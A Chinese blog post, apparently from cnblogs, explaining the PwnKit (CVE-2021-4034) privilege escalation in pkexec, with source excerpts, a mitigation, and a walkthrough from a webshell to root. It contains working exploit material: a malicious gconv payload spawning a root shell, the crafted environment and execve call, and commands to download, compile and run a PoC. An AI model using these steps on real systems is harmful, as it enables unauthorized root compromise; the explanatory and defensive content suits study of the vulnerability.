@@ -1,0 +1,273 @@
+
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/dollaikun/p/20650912" title="发布于 2026-06-19 13:32">
+    <span role="heading" aria-level="2">CVE-2021-4034-pwnkit提权</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<h2>漏洞核心原理一</h2>
+<p>CVE-2021-4034 (PwnKit) 的核心原理在于 <strong><code>pkexec</code> 程序对命令行参数处理的一个越界读取（Out-of-bounds Read）漏洞</strong>，以及由此引发的环境变量写入。</p>
+<h3>参数处理越界</h3>
+<p>在 Linux 中，一个程序的 <code>main</code> 函数接收两个重要的参数：<code>argc</code>（参数数量）和 <code>argv</code>（指向参数字符串的指针数组）。按照规范：<code>argv[0]</code> 通常是程序自身的路径，<code>argv[argc]</code> 必须是一个 <code>NULL</code> 指针。</p>
+<p>在调用 <code>pkexec</code> 时，如果攻击者强制传递一个<strong>完全为空</strong>的数组（即 <code>argc = 0</code>），那么 <code>argv[0]</code> 实际上就是 <code>NULL</code>。然而，<code>pkexec</code> 的代码逻辑假设 <code>argc</code> 至少为 1。它会尝试读取 <code>argv[1]</code> 来获取要执行的命令。由于 <code>argv[1]</code> 已经超出了 <code>argv</code> 数组的范围，根据内存布局，它会<strong>越界读取</strong>到紧随其后的 <code>envp</code>（环境变量指针数组）中的第一个元素。</p>
+<h3>将环境变量误认为路径</h3>
+<p>当 <code>pkexec</code> 越界读取了第一个环境变量后，它会将这个字符串视作一个程序路径。接着，<code>pkexec</code> 会利用环境变量中的 <code>PATH</code> 变量去寻找这个路径的绝对位置。如果寻找到匹配项，它会将寻找到的绝对路径写回 <code>argv[1]</code>。</p>
+<h1>漏洞核心原理二</h1>
+<p>pkexec 是 Linux 桌面系统中一个至关重要的权限管理工具，属于 Polkit（原名 PolicyKit） 系统组件。可以把它理解为一个 “精细化的 sudo”。和 sudo 需要配置 /etc/sudoers 文件不同，pkexec 的授权规则由系统和服务预先定义好（如：允许普通用户执行 fdisk 来分区）。为了完成这个提权操作，pkexec 程序文件本身被设置了 SUID 位，这使得它运行时天然具有 root 权限。漏洞的根源在于 pkexec 源代码中，对一个基础前提的假设错误和边界检查缺失。</p>
+<p>在C语言程序中，main 函数接收参数的标准形式是：<strong>int main(int argc, char <em>argv[], char </em>envp[])</strong>。</p>
+<div class="codehilite"><pre><span></span><code>argc：命令行参数的数量。
+
+argv：参数数组。argv[0] 是程序名自身，argv[1] 是第一个真正的参数，依此类推。
+
+envp：环境变量数组。它在内存中紧跟在 argv 数组之后。
+</code></pre></div>
+
+<p>pkexec 的代码默认了一个前提：argc 的值至少为 1（因为至少会有程序名 argv[0]）。基于这个前提，它在不验证 argc 是否真的大于0的情况下，就直接去读取 argv[1]，认为这是用户要它执行的那个“命令”。</p>
+<p>漏洞就在这里：如果攻击者能够让 argc 等于 0，那么 argv 数组就是空的。当程序试图访问 argv[1] 时，实际上会发生 “内存越界读取” —— 它读取到的并不是一个有效的命令行参数，而是紧邻着 argv 数组之后的内存内容，也就是环境变量数组 envp 的第一个元素 envp[0]。</p>
+<p><strong>简单总结成因：pkexec 错误地将攻击者可控的环境变量，当成了要执行的命令参数</strong></p>
+<h3>利用 GCONV_PATH 注入恶意库</h3>
+<p><strong>（1）污染参数</strong>：攻击者精心设置一个名为 GCONV_PATH 的环境变量，值为一个恶意路径（如 /tmp/evil）。当 argc=0 时，这个字符串就被 pkexec 当作 argv[1] 来解析。</p>
+<p><strong>（2）逻辑触发</strong>：pkexec 在处理这个“参数”时，如果发现路径有问题，会调用 g_printerr() 函数打印错误信息。这个函数为了支持多语言（国际化），需要进行字符集转换。</p>
+<p><strong>（3）路径劫持</strong>：字符集转换的模块加载路径，恰恰由 GCONV_PATH 这个环境变量控制。而在之前的逻辑中，pkexec 已经将这个环境变量设置成了攻击者提供的恶意路径（因为它以为那是 argv[1] 的一部分）。</p>
+<p><strong>（3）恶意代码执行</strong>：当 g_printerr() 触发字符集转换时，它会去加载恶意路径下的“转换模块”。这个“模块”实际上是攻击者提前放置的一个恶意共享库（.so文件）。系统会执行这个库的初始化函数。</p>
+<p><strong>（4）完成提权</strong>：由于整个 pkexec 进程是以 root 权限（SUID） 运行的，它加载执行的恶意代码也自然继承了 root 权限。至此，攻击者便从普通用户身份，完整地获取了系统的最高控制权</p>
+<h1>注意事项：</h1>
+<h4>【1】<code>pkexec</code> 程序文件本身被设置了 <strong>SUID 位</strong>，这使得它运行时<strong>天然具有 root 权限</strong></h4>
+<h4>临时修复：取消pkexec程序特权</h4>
+<div class="codehilite"><pre><span></span><code>chmod 0755 /usr/bin/pkexec
+#chmod 4755 /usr/bin/pkexec可以赋予suid
+</code></pre></div>
+
+<p>【2】查看pkexec有无suid，有才能被利用</p>
+<div class="codehilite"><pre><span></span><code>ls -la /usr/bin/pkexec
+</code></pre></div>
+
+<h4>应该显示：-rwsr-xr-x（有s位）</h4>
+<h4>【3】当看到 <code>/usr/bin/pkexec</code> 和 <code>/usr/lib/policykit-1/polkit-agent-helper-1</code> 时，经验丰富的<a href="https://cloud.tencent.com/product/tpts?from_column=20065&amp;from=20065" rel="noopener nofollow">渗透测试</a>员会立刻联想到 <strong>PwnKit</strong></h4>
+<h3>实战：</h3>
+<p>【1】已经获取到了靶机的webshell，要进行下一步的提权，先进入到/tmp目录下，<strong>载CVE-2021-4034 （Linux 系统上的 Polkit 权限提升漏洞）的PoC文件</strong></p>
+<div class="codehilite"><pre><span></span><code>wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
+</code></pre></div>
+
+<p>【2】解压poc脚本</p>
+<div class="codehilite"><pre><span></span><code>tar -zxvf main.tar.gz
+</code></pre></div>
+
+<p>【3】编译poc</p>
+<div class="codehilite"><pre><span></span><code>cd /CVE-2021-4043-main/
+make
+</code></pre></div>
+
+<p>【4】执行poc提权，再输入whoami，输出为root则成功</p>
+<div class="codehilite"><pre><span></span><code>./cve-2021-4034
+</code></pre></div>
+
+<h3>注：我这里打靶，最后一步老是报错如下，在github上面换了好几个脚本都不行，最后执行<strong>PwnKit.c(微信上面找的)就可以了</strong></h3>
+<h3>用法：（编译完成之后执行，这里注意需要cd到/tmp目录执行，否则加权限也不能执行）</h3>
+<p>【1】先上传PwnKit.c脚本到/tmp，执行编译</p>
+<div class="codehilite"><pre><span></span><code>gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
+</code></pre></div>
+
+<p>【2】此时本地会生成一个PwnKit的可执行文件</p>
+<div class="codehilite"><pre><span></span><code>chmod +X PwnKit
+./PwnKit "要执行的命令"
+#注：这里只能通过  ./PwnKit "要执行的命令"  来提升到root，也就是要执行root命令就只能用上面的
+</code></pre></div>
+
+<h2><a href="https://deathking.github.io/2022/01/26/pwnkit-cve-2021-4034-introduction/" rel="noopener nofollow">pwnkit：pkexec 本地提权漏洞介绍（CVE-2021-4034） - Ditro</a>讲的也很好</h2>
+<h2>pkexec 是什么？</h2>
+<p><code>pkexec</code> 本身是一个类似于 <code>sudo</code> 的 <code>SUID-root</code> 程序（即以root身份运行），它的功能可以看 man 手册：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">NAME</span>
+<span class="w">       </span><span class="nv">pkexec</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">Execute</span><span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="nv">command</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">another</span><span class="w"> </span><span class="nv">user</span>
+
+<span class="nv">SYNOPSIS</span>
+<span class="w">       </span><span class="nv">pkexec</span><span class="w"> </span>[<span class="o">--</span><span class="nv">version</span>]<span class="w"> </span>[<span class="o">--</span><span class="nv">disable</span><span class="o">-</span><span class="nv">internal</span><span class="o">-</span><span class="nv">agent</span>]<span class="w"> </span>[<span class="o">--</span><span class="nv">help</span>]
+
+<span class="w">       </span><span class="nv">pkexec</span><span class="w"> </span>[<span class="o">--</span><span class="nv">user</span><span class="w"> </span><span class="nv">username</span>]<span class="w"> </span><span class="nv">PROGRAM</span><span class="w"> </span>[<span class="nv">ARGUMENTS</span>...]
+
+<span class="nv">DESCRIPTION</span>
+<span class="w">       </span><span class="nv">pkexec</span><span class="w"> </span><span class="nv">allows</span><span class="w"> </span><span class="nv">an</span><span class="w"> </span><span class="nv">authorized</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">execute</span><span class="w"> </span><span class="nv">PROGRAM</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">another</span>
+<span class="w">       </span><span class="nv">user</span>.<span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="nv">PROGRAM</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">specified</span>,<span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">default</span><span class="w"> </span><span class="nv">shell</span><span class="w"> </span><span class="nv">will</span><span class="w"> </span><span class="nv">be</span><span class="w"> </span><span class="nv">run</span>.
+<span class="w">       </span><span class="k">If</span><span class="w"> </span><span class="nv">username</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">specified</span>,<span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">program</span><span class="w"> </span><span class="nv">will</span><span class="w"> </span><span class="nv">be</span><span class="w"> </span><span class="nv">executed</span>
+<span class="w">       </span><span class="nv">as</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">administrative</span><span class="w"> </span><span class="nv">super</span><span class="w"> </span><span class="nv">user</span>,<span class="w"> </span><span class="nv">root</span>.
+</code></pre></div>
+
+<p>从摘要（synopsis）一栏中我们知道：</p>
+<ul>
+<li><code>pkexec</code> 有一个可选选项 <code>--user</code> ，用于指定执行程序的用户身份；</li>
+<li>一个必选的参数 <code>PROGRAM</code> 代表要执行的程序；</li>
+<li>以及随后的传递给 <code>PROGRAM</code> 的可选参数列表 <code>ARGUMENTS...</code>。</li>
+</ul>
+<h2>漏洞成因</h2>
+<p><code>pkexec</code> 对命令行参数的解析处理不当，是 pwnkit 漏洞的主要诱因。其 <code>main()</code> 函数如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="mi">435</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="err">[]</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">436</span><span class="w"> </span><span class="err">{</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">534</span><span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="p">(</span><span class="n">guint</span><span class="p">)</span><span class="w"> </span><span class="n">argc</span><span class="p">;</span><span class="w"> </span><span class="n">n</span><span class="o">++</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">535</span><span class="w">     </span><span class="err">{</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">568</span><span class="w">     </span><span class="err">}</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">610</span><span class="w">   </span><span class="k">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_strdup</span><span class="w"> </span><span class="p">(</span><span class="n">argv</span><span class="o">[</span><span class="n">n</span><span class="o">]</span><span class="p">);</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">629</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">path</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">'/'</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">630</span><span class="w">     </span><span class="err">{</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">632</span><span class="w">       </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_find_program_in_path</span><span class="w"> </span><span class="p">(</span><span class="k">path</span><span class="p">);</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">639</span><span class="w">       </span><span class="n">argv</span><span class="o">[</span><span class="n">n</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">;</span>
+<span class="w"> </span><span class="mi">640</span><span class="w">     </span><span class="err">}</span>
+</code></pre></div>
+
+<p>这段代码先会遍历 <code>argv</code> 处理命令行参数（534-569行），由于在常见的情况下，<code>argc</code> 至少为 1，此时 <code>argv[0]</code> 是程序名自身，因此编码的时候从 <code>n = 1</code> 开始遍历。然后如果想要执行的程序不是一个绝对路径，那么它就会在 <code>PATH</code> 环境变量中搜索定位该程序（610-640行）。</p>
+<p>不幸的是，完全可以在调用 <code>execve</code> 时, 以 <code>NULL</code> 作为 <code>execve</code> 的 <code>argv</code> 参数。这样，被启动的程序的 <code>argc</code> 就为 0。进一步，被启动程序的 <code>argv[0]</code> 也就会是 <code>NULL</code>。那么：</p>
+<ul>
+<li>第534行，<code>n</code> 会因为不满足 <code>n &lt; argc</code> 而被永远地设置为 1；</li>
+<li>第610行，<code>argv[n]</code> 自然就是 <code>argv[1]</code>，这就是一个越界读；</li>
+<li>第639行，<code>argv[1]</code> 会被越界写成指针 <code>s</code>，其中 <code>s</code> 是找到的程序路径；</li>
+</ul>
+<p>所以问题的关键就在于，越界读读到的 <code>argv[1]</code> 到底是什么？为了说清这个问题，这里需要做一些必要的介绍。当我们通过 <code>execve()</code> 去执行一个新程序时，内核首先将参数（<code>argv</code>）和环境变量（<code>envp</code>）列表拷贝到程序的栈上。正常的情况应该是像下面这样：</p>
+<p><img alt="image-20260415214902179" src="https://img2024.cnblogs.com/blog/3801164/202606/3801164-20260619133207378-1447361835.png"></p>
+<p>需要注意的是，<code>argv</code> 和 <code>envp</code> 指针在内存中的布局是连续的。因此如果 <code>argc</code> 为 0，那么越界的 <code>argv[1]</code> 实际上是 <code>envp[0]</code>，<code>argv[1]</code> 也就是指向了环境变量的第一个变量，这里的 <code>value</code>。造成的结果就是：</p>
+<ul>
+<li>第 610 行，用于决定要执行程序的路径的变量 <code>path</code> 实际上是读取的 <code>argv[1] == envp[0] == "value"</code>；</li>
+<li>第 632 行，由于 <code>path</code> 并不是一个相对路径（629行判断），因此 <code>path == "value"</code> 就传递给 <code>g_find_program_in_path()</code> 函数；</li>
+<li><code>g_find_program_in_path()</code> 函数在 <code>PATH</code> 环境变量中搜索名为 <code>value</code> 的可执行文件；</li>
+<li>如果找到了，那么它的完整路径就返回给 <code>pkexec</code> 的 <code>main()</code> 函数；</li>
+<li>第 639 行，通过 <code>argv[1]</code> 也就是 <code>envp[0]</code> 的越界写，完整路径覆盖了首个环境变量。</li>
+</ul>
+<p>如果说得再清楚一点，就是：</p>
+<ul>
+<li>如果环境变量 <code>PATH=name</code>，并且当前工作目录存在 <code>name</code> 目录以及名为 <code>value</code> 的可执行文件，那么 <code>envp[0]</code> 就会最终被越界写为 <code>name/value</code>；</li>
+<li>进一步地，如果环境变量 <code>PATH=name=.</code>，并且当前工作目录存在 <code>name=.</code> 目录并包含了名为 <code>value</code> 的可执行文件，那么 <code>envp[0]</code> 最终被越界写为 <code>name=./value</code>；</li>
+</ul>
+<p>观察到什么了么？这个越界漏洞允许我们将像 <code>LD_PRELOAD</code> 这样的“不安全的”环境变量重新引入到 <code>pkexec</code> 的执行环境中。对于这类 SUID 程序来说，在执行 <code>main()</code> 函数之前，通常 <code>ld.so</code> 会移除这些“不安全的”环境变量。</p>
+<p>关键就是要如何利用这个强有力的基本操作。</p>
+<h2>利用原理</h2>
+<p>整个漏洞利用过程还是有一些小插曲。尽管我们有一个越界写，可以修改 <code>envp[0]</code> 的值，但是 <code>pkexec</code> 会在随后的702行清除掉环境变量。</p>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="mi">639</span><span class="w">       </span><span class="n">argv</span><span class="o">[</span><span class="n">n</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">;</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">657</span><span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">environment_variables_to_save</span><span class="o">[</span><span class="n">n</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">NULL</span><span class="p">;</span><span class="w"> </span><span class="n">n</span><span class="o">++</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">658</span><span class="w">     </span><span class="err">{</span>
+<span class="w"> </span><span class="mi">659</span><span class="w">       </span><span class="n">const</span><span class="w"> </span><span class="n">gchar</span><span class="w"> </span><span class="o">*</span><span class="k">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">environment_variables_to_save</span><span class="o">[</span><span class="n">n</span><span class="o">]</span><span class="p">;</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">662</span><span class="w">       </span><span class="k">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_getenv</span><span class="w"> </span><span class="p">(</span><span class="k">key</span><span class="p">);</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">670</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">validate_environment_variable</span><span class="w"> </span><span class="p">(</span><span class="k">key</span><span class="p">,</span><span class="w"> </span><span class="k">value</span><span class="p">))</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">675</span><span class="w">     </span><span class="err">}</span>
+<span class="w"> </span><span class="p">...</span>
+<span class="w"> </span><span class="mi">702</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clearenv</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div>
+
+<p>研究者进一步发现 <code>pkexec</code> 会调用 GLib （GNOME 库，而非GNU C） 的 <code>g_printerr()</code> 函数。比如 <code>validate_enviornment_variable()</code> 以及 <code>log_message()</code> 都会调用 <code>g_printerr()</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="mi">88</span><span class="w"> </span><span class="n">log_message</span><span class="w"> </span><span class="p">(</span><span class="n">gint</span><span class="w">     </span><span class="n">level</span><span class="p">,</span>
+<span class="w">  </span><span class="mi">89</span><span class="w">              </span><span class="n">gboolean</span><span class="w"> </span><span class="n">print_to_stderr</span><span class="p">,</span>
+<span class="w">  </span><span class="mi">90</span><span class="w">              </span><span class="k">const</span><span class="w">    </span><span class="n">gchar</span><span class="w"> </span><span class="o">*</span><span class="n">format</span><span class="p">,</span>
+<span class="w">  </span><span class="mi">91</span><span class="w">              </span><span class="o">...</span><span class="p">)</span>
+<span class="w">  </span><span class="mi">92</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="o">...</span>
+<span class="w"> </span><span class="mi">125</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">print_to_stderr</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">126</span><span class="w">     </span><span class="n">g_printerr</span><span class="w"> </span><span class="p">(</span><span class="s2">"</span><span class="si">%s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span>
+<span class="o">------------------------------------------------------------------------</span>
+<span class="w"> </span><span class="mi">383</span><span class="w"> </span><span class="n">validate_environment_variable</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">gchar</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span>
+<span class="w"> </span><span class="mi">384</span><span class="w">                                </span><span class="k">const</span><span class="w"> </span><span class="n">gchar</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">)</span>
+<span class="w"> </span><span class="mi">385</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="o">...</span>
+<span class="w"> </span><span class="mi">406</span><span class="w">           </span><span class="n">log_message</span><span class="w"> </span><span class="p">(</span><span class="n">LOG_CRIT</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span>
+<span class="w"> </span><span class="mi">407</span><span class="w">                        </span><span class="s2">"The value for the SHELL variable was not found the /etc/shells file"</span><span class="p">);</span>
+<span class="w"> </span><span class="mi">408</span><span class="w">           </span><span class="n">g_printerr</span><span class="w"> </span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w"> </span><span class="mi">409</span><span class="w">                       </span><span class="s2">"This incident has been reported.</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+</code></pre></div>
+
+<p><code>g_printerr()</code> 函数通常是用来打印 UTF-8 编码的错误信息，但如果环境变量 <code>CHARSET</code> 不是 UTF-8 的话，该函数也可以处理。当然，这个漏洞的过错并不在 <code>CHARSET</code> 环境变量上。为了将 UTF-8 转化为其它字符集，<code>g_printerr()</code> 会调用 glibc 的 <code>iconv_open()</code> 函数（对，这个是GNU C库的函数）。</p>
+<p><code>iconv_open()</code> 需要依赖一个小型共享库来完成字符集转换。通常来说，源字符集（<code>"from"</code>）、目标字符集（<code>"to"</code>）以及库名称（<code>library name</code>）三元组所决定的转换规则，是从一个默认的配置文件，也就是 <code>/usr/lib/gconv/gconv-modules</code> 中读取的。当然，可以也使用 <code>GCONV_PATH</code> 环境变量去强制 <code>iconv_open()</code> 函数读取指定的文件。考虑到 <code>GCONV_PATH</code> 这种可能会导致任意库文件执行的特性，它被视作“不安全的”环境变量。这样，在执行 SUID 的程序时，<code>ld.so</code> 会将其移除。</p>
+<p>现在, 有了 <code>pkexec</code> 的越界写漏洞，我们能够重新引入这些不安全的环境变量。是时候大显身手了。</p>
+<h3>一、准备恶意gconv</h3>
+<p>第一步，准备编译恶意的 gconv 共享库。这个恶意程序本身也是一个 SUID 程序，在 <code>setuid()</code> 等调用之后，通过 <code>execve()</code> 为我们启动一个 shell：</p>
+<div class="codehilite"><pre><span></span><code><span class="nb nb-Type">void</span><span class="w"> </span><span class="n">compile_so</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="s2">"payload.c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"wb"</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">f</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">fatal</span><span class="p">(</span><span class="s2">"fopen"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nb">char</span><span class="w"> </span><span class="n">so_code</span><span class="p">[]</span><span class="o">=</span>
+<span class="w">        </span><span class="s2">"#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"#include &lt;unistd.h&gt;</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"void gconv() {</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  return;</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"}</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"void gconv_init() {</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  setuid(0); seteuid(0); setgid(0); setegid(0);</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  static char *a_argv[] = { </span><span class="se">\"</span><span class="s2">sh</span><span class="se">\"</span><span class="s2">, NULL };</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  static char *a_envp[] = { </span><span class="se">\"</span><span class="s2">PATH=/bin:/usr/bin:/sbin</span><span class="se">\"</span><span class="s2">, NULL };</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  execve(</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">, a_argv, a_envp);</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"  exit(0);</span><span class="se">\n</span><span class="s2">"</span>
+<span class="w">        </span><span class="s2">"}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">fwrite</span><span class="p">(</span><span class="n">so_code</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">so_code</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
+<span class="w">    </span><span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s2">"gcc -o payload.so -shared -fPIC payload.c"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>二、准备绕过程序搜索</h3>
+<p>第二步要创建 <code>GCONV_PATH=./lol</code> 文件，这一步是为了让 <code>pkexec()</code> 632 行正常返回。</p>
+<h3>三、准备恶意 gconv-modules</h3>
+<p>第三步，准备恶意的 <code>gconv-modules</code> 配置文件（见上一章节关于 <code>gconv-modules</code> 三元组部分），引导程序在转换字符集时调用我们写好的 payload 程序：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">module</span><span class="w">  </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="o">//</span><span class="w">    </span><span class="n">INTERNAL</span><span class="w">    </span><span class="o">../</span><span class="n">payload</span><span class="w">    </span><span class="mi">2</span>
+</code></pre></div>
+
+<h3>四、准备调用环境</h3>
+<p>第四步，准备调用 <code>pkexec()</code> 的 <code>argc</code> 与 <code>envp</code>：</p>
+<div class="codehilite"><pre><span></span><code>    char *a_argv[]={ NULL };
+    char *a_envp[]={
+        "lol",
+        "PATH=GCONV_PATH=.",
+        "LC_MESSAGES=en_US.UTF-8",
+        "XAUTHORITY=../LOL",
+        NULL
+    };
+</code></pre></div>
+
+<p>完事具备，只欠东风，利用 <code>execve</code> 调用 <code>pkexec</code>，提权获得 root shell：</p>
+<div class="codehilite"><pre><span></span><code>    execve("/usr/bin/pkexec", a_argv, a_envp);
+</code></pre></div>
+
+<p>PoC 执行完毕后布局如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="o">.</span>
+<span class="o">.</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">blasty</span><span class="o">-</span><span class="n">vs</span><span class="o">-</span><span class="n">pkexec</span><span class="o">.</span><span class="n">c</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">GCONV_PATH</span><span class="o">=.</span>
+<span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">lol</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">lol</span>
+<span class="err">│</span><span class="w">   </span><span class="err">└──</span><span class="w"> </span><span class="n">gconv</span><span class="o">-</span><span class="n">modules</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">c</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">so</span>
+<span class="err">└──</span><span class="w"> </span><span class="n">pkexec</span><span class="o">-</span><span class="n">poc</span>
+</code></pre></div>
+
+</div>
+<div id="MySignature" role="contentinfo">
+    <p>本文来自博客园，作者：<a href="https://www.cnblogs.com/dollaikun/" target="_blank">Doll_Marker</a>，转载请注明原文链接：<a href="https://www.cnblogs.com/dollaikun/p/20650912" target="_blank">https://www.cnblogs.com/dollaikun/p/20650912</a></p>
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0.001388888888888889" data-date-updated="2026-06-19 13:34">2026-06-19 13:32</span>&nbsp;
+<a href="https://www.cnblogs.com/dollaikun">Doll_Marker</a>&nbsp;
+阅读(<span id="post_view_count">47</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20650912);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fdollaikun%2Fp%2F20650912&amp;targetId=20650912&amp;targetType=0" target="_blank">举报</a>
+</div>
+        
